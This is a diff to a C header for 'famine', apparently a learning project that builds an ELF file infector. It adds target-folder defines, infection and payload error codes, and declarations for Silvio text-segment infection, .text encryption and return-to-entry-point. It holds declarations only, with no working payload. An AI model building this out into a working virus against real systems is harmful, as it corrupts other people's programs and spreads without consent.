@@ -17,17 +17,18 @@
 /*                          INCLUDES                                        */
 /****************************************************************************/
 
-#include <stdio.h>       // FFLUSH FPUTS PERROR
-#include <stdlib.h>      // MALOC/FREE
-#include <fcntl.h>       // OPEN
-#include <sys/syscall.h> // SYSCALL
-#include <string.h>      // STRERROR
-#include <sys/mman.h>    // MMAP MUNMAP
-#include <unistd.h>      // CLOSE EXIT LSEEK WRITE
-#include <elf.h>         // ELF STRUCTURE
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <elf.h>
 #include <errno.h>
 #include <stdbool.h>
 #include <sys/stat.h>
+#include <dirent.h>
 
 /****************************************************************************/
 /*                          DEFINES                                         */
@@ -51,30 +52,44 @@
 /* Error codes */
 enum e_error
 {
+    // Lib c error
     ERROR_OPEN = 1,
+    ERROR_OPENDIR,
     ERROR_READ,
     ERROR_WRITE,
     ERROR_CLOSE,
+    ERROR_CLOSEDIR,
     ERROR_MALLOC,
-    ERROR_INPUT_ARGUMENTS_NUMBERS,
+    ERROR_MALLOC_FAMINE_STRUCT,
     ERROR_LSEEK,
+    ERROR_MMAP,
+    ERROR_STAT,
+    // File type error
     ERROR_NOT_ELF,
     ERROR_NOT_ELF32,
-    ERROR_MMAP,
     ERROR_NOT_A_REGULAR_FILE,
-    ERROR_STAT,
     ERROR_NOT_EXECUTABLE_BINARY,
     ERROR_ELF_NOT_LITTLE_ENDIAN,
-    ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD,
     ERROR_FILE_IS_ALREADY_INFECTED,
+    // Payload error
+    ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD,
     ERROR_RET2OEP_NOT_FOUND,
     ERROR_GETENCRYPTEDSECTIONADDR_NOT_FOUND,
     ERROR_KEYSECTION_NOT_FOUND,
     ERROR_GETENCRYPTEDSECTIONSIZE_NOT_FOUND,
     ERROR_GETTEXTSECTIONADDR_NOT_FOUND,
     ERROR_GETTEXTSIZE_NOT_FOUND,
+    // Functions specific error
+    ERROR_CONCAT_STRINGS,
+    // Others error
+    ERROR_INPUT_ARGUMENTS_NUMBERS,
     NB_OF_ERROR_CODES /* Always keep last */
 };
+
+#define DEBUG true
+
+#define FOLDER_TO_INFECT_ONE "/tmp/test/"
+#define FOLDER_TO_INFECT_TWO "/tmp/test2/"
 
 #define PAGE_SIZE 0x1000
 #define SECTION_TO_ENCRYPT_NAME ".text"
@@ -149,14 +164,20 @@ typedef struct s_famine
     size_t infected_file_size;
 } t_famine;
 
+typedef struct s_list
+{
+    char *file_name;
+    struct s_list *next;
+} t_list;
+
 /****************************************************************************/
 /*                          FUNCTIONS DEFINITIONS                           */
 /****************************************************************************/
 
-void check_elf_header(t_famine *famine);
+int check_elf_header(t_famine *famine);
 void set_string_table_ptr(t_famine *famine);
 
-void choose_infection_method(t_famine *famine);
+void apply_infection(t_famine *famine);
 void silvio_text_infection(t_famine *famine);
 
 size_t find_keysection_offset_elf64(t_famine *famine);
@@ -193,7 +214,8 @@ void print_famine_infos(t_famine *famine);
 void print_memory_hex(void *memory_ptr, size_t memory_size);
 void print_memory_char(void *memory_ptr, size_t memory_size);
 void free_famine(t_famine *famine);
-void error(int err, t_famine *famine);
+int error(int err, t_famine *famine);
+char *concat_strings(const char *str1, const char *str2);
 
 /****************************************************************************/
 /*                          ASM FUNCTIONS DEFINITIONS                       */
